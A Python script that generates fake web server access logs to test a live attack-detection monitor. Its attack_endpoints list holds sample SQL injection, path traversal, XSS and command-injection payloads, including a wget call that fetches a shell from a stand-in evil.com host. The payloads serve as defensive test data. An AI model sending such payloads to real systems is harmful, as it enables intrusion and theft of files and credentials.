"""
Simulate a live updating log file for testing the live monitor
Run this script in one terminal while the main app is running
"""

import random
import time
import os

# Configuration
OUTPUT_FILE = "live_test.log"
LINES_PER_SECOND = 3  # Adjust as needed

# Sample data pools
normal_ips = [f"192.168.1.{i}" for i in range(1, 50)]
attacker_ips = ["185.220.101.45", "45.33.32.156", "103.21.244.15", "91.240.118.172"]

methods = ["GET", "POST", "PUT", "DELETE"]
method_weights = [70, 20, 5, 5]

# Normal endpoints
normal_endpoints = [
    "/", "/index.html", "/home", "/about", "/contact",
    "/api/users", "/api/login", "/api/data", "/products",
    "/images/logo.png", "/css/style.css", "/js/app.js",
]

# Attack endpoints (for testing alerts)
attack_endpoints = [
    # SQL Injection
    "/search?q=' OR '1'='1",
    "/api/users?id=1 UNION SELECT * FROM passwords",
    "/login?user=admin'--",
    
    # Path Traversal / LFI
    "/download?file=../../../etc/passwd",
    "/include.php?page=....//....//etc/passwd",
    
    # RCE attempts
    "/api/exec?cmd=whoami",
    "/shell.php?cmd=cat /etc/passwd",
    "/api/system?command=wget http://evil.com/shell",
    
    # XSS
    "/search?q=<script>alert('xss')</script>",
    "/comment?text=<img onerror='alert(1)' src='x'>",
    
    # Sensitive file access
    "/.env",
    "/wp-admin/admin.php",
    "/phpmyadmin/index.php",
    "/config.php",
    "/backup.sql",
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "sqlmap/1.7.2",  # Attack tool
    "Nikto/2.1.6",   # Attack tool
]

def generate_normal_log():
    """Generate a normal log entry"""
    ip = random.choice(normal_ips)
    method = random.choices(methods, weights=method_weights)[0]
    endpoint = random.choice(normal_endpoints)
    status = random.choices([200, 201, 301, 304], weights=[80, 5, 10, 5])[0]
    size = random.randint(500, 10000)
    ua = random.choice(user_agents[:4])
    
    timestamp = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{timestamp}] "{method} {endpoint} HTTP/1.1" {status} {size} "-" "{ua}"'

def generate_attack_log():
    """Generate an attack log entry"""
    ip = random.choice(attacker_ips)
    method = random.choice(["GET", "POST"])
    endpoint = random.choice(attack_endpoints)
    status = random.choices([200, 403, 404, 500], weights=[30, 30, 30, 10])[0]
    size = random.randint(100, 5000)
    ua = random.choice(user_agents)
    
    timestamp = time.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{timestamp}] "{method} {endpoint} HTTP/1.1" {status} {size} "-" "{ua}"'

def main():
    print(f"📝 Starting log simulator: {OUTPUT_FILE}")
    print(f"⏱️  Generating ~{LINES_PER_SECOND} lines per second")
    print(f"🎯 Attack probability: 15%")
    print(f"Press Ctrl+C to stop\n")
    
    # Create or truncate file
    open(OUTPUT_FILE, 'w').close()
    
    count = 0
    attack_count = 0
    
    try:
        while True:
            # 15% chance of attack, 85% normal
            if random.random() < 0.15:
                line = generate_attack_log()
                attack_count += 1
                print(f"🔴 ATTACK #{attack_count}: {line[:80]}...")
            else:
                line = generate_normal_log()
            
            # Append to file
            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
            
            count += 1
            
            if count % 10 == 0:
                print(f"📊 Total: {count} lines | Attacks: {attack_count}")
            
            time.sleep(1.0 / LINES_PER_SECOND)
    
    except KeyboardInterrupt:
        print(f"\n\n✅ Stopped. Generated {count} lines ({attack_count} attacks)")
        print(f"📁 Log file: {os.path.abspath(OUTPUT_FILE)}")

if __name__ == "__main__":
    main()
